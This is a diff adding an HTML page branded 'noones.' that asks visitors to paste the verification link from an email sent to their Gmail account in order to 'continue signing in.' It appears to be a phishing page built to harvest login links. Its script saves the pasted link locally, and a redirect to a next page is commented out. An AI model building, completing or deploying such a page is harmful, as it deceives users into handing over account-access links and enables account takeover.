@@ -1,0 +1,33 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verify Email Link</title>
+<style>
+body{margin:0;background:#1c1c1c;color:#f2f2f2;font-family:Arial,sans-serif;display:flex;justify-content:center}
+.wrap{max-width:430px;width:100%;padding:40px 22px}
+.logo{font-size:42px;font-weight:800;color:#39d06f;text-align:center;margin:10px 0 35px}
+.card{background:#2a2a2a;border-radius:18px;padding:28px}
+h1{margin:0 0 10px;font-size:28px}
+p{color:#a8a8a8;line-height:1.5}
+input{width:100%;padding:16px;border-radius:12px;border:1px solid #444;background:#1f1f1f;color:#fff;font-size:15px;margin:18px 0;box-sizing:border-box}
+button{width:100%;padding:16px;border:none;border-radius:12px;background:#3ecf7e;color:#fff;font-size:16px;font-weight:700;cursor:pointer}
+.note{text-align:center;font-size:13px;margin-top:18px}
+a{color:#3ecf7e}
+</style>
+<style>img,video{max-width:100%;height:auto}body{max-width:100%;overflow-x:hidden}.container,.card,.wrapper{max-width:100%;width:100%!important}@media(max-width:768px){*{box-sizing:border-box}body{padding:0;margin:0}}</style>
+</head><body><div class="wrap">
+<div class="logo">noones.</div>
+<div class="card">
+<h1>Paste the verification link</h1>
+<p>Open the email sent to your Gmail account, copy the verification link, then paste it below to continue signing in.</p>
+<input id="link" placeholder="https://...">
+<button onclick="submitLink()">Continue</button>
+<div class="note">Didn't receive the email? Check your Spam folder or request another email.</div>
+</div></div>
+<script>
+function submitLink(){
+ const v=document.getElementById('link').value.trim();
+ if(!v){alert('Paste the verification link first.');return;}
+ localStorage.setItem('verificationLink',v);
+ alert('Link received successfully.');
+ // window.location.href='nextpage.html';
+}
+</script></body></html>
